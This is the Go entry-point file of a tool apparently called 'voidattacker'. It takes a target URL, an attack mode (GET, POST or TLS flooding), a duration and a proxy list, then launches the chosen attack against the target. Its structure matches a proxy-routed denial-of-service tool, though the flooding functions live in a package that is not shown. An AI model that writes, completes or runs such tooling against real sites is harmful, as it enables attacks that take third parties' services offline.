// main.go: Entry point
package main

import (
	"flag"
	"fmt"
	"time"
	"voidattacker/attack"
)

func main() {
	url := flag.String("url", "http://target.com", "Target URL")
	mode := flag.String("mode", "get", "Attack mode: get/post/tls")
	duration := flag.Int("duration", 60, "Duration in seconds")
	proxyfile := flag.String("proxyfile", "data/proxy.txt", "Proxy file path")

	flag.Parse()

	fmt.Println("Starting attack on:", *url, "with mode:", *mode)
	start := time.Now()

	switch *mode {
	case "get":
		attack.LaunchGET(*url)
	case "post":
		attack.LaunchPOST(*url)
	case "tls":
		attack.LaunchTLS(*url)
	default:
		fmt.Println("Unknown mode")
	}

	time.Sleep(time.Duration(*duration) * time.Second)
	fmt.Println("Attack ended. Duration:", time.Since(start))
}
